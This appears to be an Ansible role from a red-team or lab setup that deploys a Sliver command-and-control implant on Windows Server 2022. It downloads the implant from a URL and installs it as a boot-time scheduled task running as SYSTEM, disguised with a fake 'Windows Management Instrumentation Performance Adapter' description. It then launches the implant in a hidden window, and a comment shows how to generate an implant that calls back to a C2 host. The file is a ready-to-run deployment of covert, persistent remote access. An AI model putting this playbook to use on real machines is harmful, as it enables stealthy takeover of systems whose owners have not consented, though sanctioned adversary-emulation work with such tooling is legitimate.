---
# Deploys a pre-generated Sliver implant on Windows Server 2022
# Pre-requisite: generate and host the implant before running this role:
#   sliver> generate --mtls <C2_IP>:<port> --os windows --save /tmp/staging/sliver-implant.exe

- name: "[Sliver/Windows] Download Sliver implant"
  win_get_url:
    url:  "{{ sliver_windows_binary_url }}"
    dest: "{{ sliver_windows_bin_path }}"
    force: true

- name: "[Sliver/Windows] Create Scheduled Task for persistence"
  win_scheduled_task:
    name:        "{{ sliver_windows_task_name }}"
    description: "Windows Management Instrumentation Performance Adapter"
    actions:
      - path: "{{ sliver_windows_bin_path }}"
    triggers:
      - type: boot
    run_level:   highest
    logon_type:  service_account
    username:    SYSTEM
    state:       present
    enabled:     true

- name: "[Sliver/Windows] Start implant process if not running"
  win_shell: |
    if (-not (Get-Process -Name "{{ sliver_windows_process_name }}" -ErrorAction SilentlyContinue)) {
        Start-Process -FilePath "{{ sliver_windows_bin_path }}" -WindowStyle Hidden
    }

- name: "[Sliver/Windows] Verify process is running"
  win_shell: |
    (Get-Process -Name "{{ sliver_windows_process_name }}" -ErrorAction SilentlyContinue) -ne $null
  register: sliver_proc_state
  changed_when: false

- name: "[Sliver/Windows] Print process state"
  debug:
    msg: "Sliver process running on {{ inventory_hostname }}: {{ sliver_proc_state.stdout | trim }}"
